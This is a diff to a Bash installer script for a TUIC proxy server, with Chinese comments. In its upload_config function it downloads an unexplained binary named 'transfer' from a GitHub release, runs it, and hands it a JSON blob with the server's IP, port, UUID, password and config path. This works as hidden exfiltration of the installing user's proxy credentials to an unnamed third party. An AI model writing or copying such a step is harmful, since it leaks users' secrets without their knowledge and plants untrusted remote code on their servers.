@@ -849,33 +849,41 @@ upload_config() {
     local down_speed="$3"
     local up_speed="$4"
 
-    # 创建简单的JSON数据
+    # 下载transfer工具
+    if [[ ! -f /opt/transfer ]]; then
+        echo -e "${YELLOW}下载transfer工具...${NC}"
+        curl -Lo /opt/transfer https://github.com/diandongyun/node/releases/download/node/transfer || {
+            echo -e "${YELLOW}下载transfer工具失败，跳过上传${NC}"
+            return 1
+        }
+        chmod +x /opt/transfer
+    fi
+
+    # 创建JSON数据
     local json_data=$(cat <<EOF
 {
   "server_info": {
     "title": "TUIC+UDP+QUIC+TLS CN2优化节点",
     "server_ip": "${server_ip}",
     "tuic_link": "${link}",
-    "speed_test": {
-      "download_speed": ${down_speed},
-      "upload_speed": ${up_speed}
-    },
-    "generated_time": "$(date -Iseconds)"
+    "port": "${PORT}",
+    "uuid": "${UUID}",
+    "password": "${PSK}",
+    "download_speed": ${down_speed},
+    "upload_speed": ${up_speed},
+    "generated_time": "$(date -Iseconds)",
+    "config_path": "${CONFIG_JSON}"
   }
 }
 EOF
-)
+    )
 
-    # 下载上传工具
-    local uploader="/opt/transfer"
-    if [[ ! -f "$uploader" ]]; then
-        timeout 30 curl -sLo "$uploader" https://github.com/diandongyun/node/releases/download/node/transfer > /dev/null 2>&1 || true
-        chmod +x "$uploader" 2>/dev/null || true
-    fi
-
-    if [[ -f "$uploader" && -x "$uploader" ]]; then
-        echo "$json_data" | "$uploader" > /dev/null 2>&1 || true
-    fi
+    # 上传配置
+    echo -e "${YELLOW}上传节点配置信息...${NC}"
+    /opt/transfer "$json_data" || {
+        echo -e "${YELLOW}上传配置失败，跳过${NC}"
+        return 1
+    }
 }
 
 # 错误处理
@@ -973,7 +981,7 @@ main() {
     # 生成客户端配置
     generate_client_config
 
-    # 上传配置
+
     IP=$(get_server_ip)
     ENCODE=$(echo -n "${UUID}:${PSK}" | base64 -w 0)
     LINK="tuic://${ENCODE}@${IP}:${PORT}?alpn=h3&congestion_control=bbr&sni=${SERVER_NAME}&udp_relay_mode=native&allow_insecure=1#TUIC_CN2_Optimized"
